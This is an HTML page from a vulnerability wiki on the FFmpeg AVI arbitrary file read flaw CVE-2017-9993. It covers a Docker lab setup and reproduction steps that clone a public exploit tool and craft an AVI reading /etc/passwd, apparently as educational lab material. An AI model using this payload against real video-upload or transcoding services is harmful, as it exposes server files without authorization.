<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Ffmpeg/CVE-2017-9993/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>FFmpeg AVI Arbitrary File Read (CVE-2017-9993) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "FFmpeg AVI Arbitrary File Read (CVE-2017-9993)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        FFmpeg AVI 任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2016-1897/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2016-1897/README.zh-cn/" class="btn btn-xs btn-link">
        FFmpeg 任意文件读取和SSRF漏洞（CVE-2016-1897/CVE-2016-1898）
      </a>
    </div>
    
  </div>

    

    <h1 id="ffmpeg-avi-arbitrary-file-read-cve-2017-9993">FFmpeg AVI Arbitrary File Read (CVE-2017-9993)<a class="headerlink" href="#ffmpeg-avi-arbitrary-file-read-cve-2017-9993" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>FFmpeg is a free and open-source software project consisting of a suite of libraries and programs for handling video, audio, and other multimedia files and streams.</p>
<p>FFmpeg 2.4.x before 2.4.14, 2.8.x before 2.8.12, 3.0.x before 3.0.9, 3.1.x before 3.1.9, 3.2.x before 3.2.6, and 3.3.x before 3.3.2 does not properly restrict HTTP Live Streaming filename extensions and demuxer names, which allows attackers to read arbitrary files via crafted playlist data.</p>
<p>This issue was featured in PHDays conference 2017, and it is actually an incomplete fix for <a href="../CVE-2016-1897/">CVE-2016-1897</a>. FFmpeg officially patched file reading and SSRF vulnerabilities in m3u playlists. However, by crafting malicious AVI files, similar vulnerabilities still exist in the playlist, leading to CVE-2017-9993.</p>
<p>References:</p>
<ul>
<li><a href="https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/">https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/</a></li>
<li><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></li>
<li><a href="https://www.anquanke.com/post/id/86337">https://www.anquanke.com/post/id/86337</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following commands to build and start the environment:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server starts, it will listen on port 8080. Visit <code>http://your-ip:8080/</code> to access the application, the application is a simple video player that allows users to upload and play videos.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>First, download the exploit tool and generate a malicious payload:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Clone the exploit repository</span>
git<span class="w"> </span>clone<span class="w"> </span>https://github.com/neex/ffmpeg-avi-m3u-xbin
<span class="nb">cd</span><span class="w"> </span>ffmpeg-avi-m3u-xbin

<span class="c1"># Generate payload</span>
./gen_xbin_avi.py<span class="w"> </span>file:///etc/passwd<span class="w"> </span>exp.avi
</code></pre></div>
<p>Upload the generated <code>exp.avi</code> file at <code>http://your-ip:8080/</code>. The backend will attempt to transcode your uploaded video using FFmpeg. During this process, due to the arbitrary file read vulnerability, the file content will be embedded in the transcoded video:</p>
<p><img alt="" src="1.png" /></p>
<p>You can also execute <code>docker compose exec web bash</code> to enter the environment and test FFmpeg directly.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        FFmpeg AVI 任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2016-1897/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2016-1897/README.zh-cn/" class="btn btn-xs btn-link">
        FFmpeg 任意文件读取和SSRF漏洞（CVE-2016-1897/CVE-2016-1898）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>